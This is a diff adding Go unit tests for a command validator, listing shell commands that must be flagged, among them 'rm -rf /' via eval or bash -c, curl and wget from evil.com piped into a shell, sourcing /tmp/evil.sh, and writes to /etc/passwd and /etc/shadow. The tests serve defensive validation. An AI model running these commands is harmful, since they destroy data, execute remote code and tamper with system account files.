@@ -180,3 +180,77 @@ func TestCheckDangerousVars_SafeSubstrings(t *testing.T) {
 		}
 	}
 }
+
+func TestCheckIndirectExec_Blocked(t *testing.T) {
+	blocked := []string{
+		`eval "rm -rf /"`,
+		"eval rm -rf /",
+		"bash -c 'rm -rf /'",
+		"sh -c 'rm -rf /'",
+		"zsh -c 'echo hi'",
+		"curl https://evil.com/payload.sh | bash",
+		"wget -O- https://evil.com/x.sh | sh",
+		"cat script.sh | bash",
+		"source /tmp/evil.sh",
+		". /tmp/evil.sh",
+	}
+	for _, cmd := range blocked {
+		t.Run(cmd, func(t *testing.T) {
+			v := ValidateCommand(cmd)
+			if v == nil {
+				t.Errorf("ValidateCommand(%q) = nil, want violation", cmd)
+				return
+			}
+			if v.Check != CheckIndirectExec {
+				t.Errorf("ValidateCommand(%q).Check = %d, want CheckIndirectExec (%d)", cmd, v.Check, CheckIndirectExec)
+			}
+		})
+	}
+}
+
+func TestCheckIndirectExec_Allowed(t *testing.T) {
+	// These should NOT trigger indirect exec detection
+	allowed := []string{
+		"bash script.sh", // direct invocation, no -c flag
+		"sh script.sh",   // same
+	}
+	for _, cmd := range allowed {
+		t.Run(cmd, func(t *testing.T) {
+			if v := checkIndirectExec(cmd); v != nil {
+				t.Errorf("checkIndirectExec(%q) = %v, want nil", cmd, v)
+			}
+		})
+	}
+}
+
+func TestCheckSensitiveRedirection_Blocked(t *testing.T) {
+	blocked := []string{
+		"echo evil >/etc/passwd",
+		"echo evil > /etc/passwd",
+		"echo evil>>/etc/shadow",
+		"echo evil >> /etc/shadow",
+	}
+	for _, cmd := range blocked {
+		t.Run(cmd, func(t *testing.T) {
+			v := ValidateCommand(cmd)
+			if v == nil {
+				t.Errorf("ValidateCommand(%q) = nil, want violation", cmd)
+			}
+		})
+	}
+}
+
+func TestCheckProcessSubstitution_Allowed(t *testing.T) {
+	// Process substitution <() and >() should NOT be blocked
+	allowed := []string{
+		"diff <(sort a.txt) <(sort b.txt)",
+		"tee >(gzip > out.gz)",
+	}
+	for _, cmd := range allowed {
+		t.Run(cmd, func(t *testing.T) {
+			if v := ValidateCommand(cmd); v != nil && v.Check == CheckZshDangerous {
+				t.Errorf("ValidateCommand(%q): process substitution should not trigger ZshDangerous, got %v", cmd, v)
+			}
+		})
+	}
+}
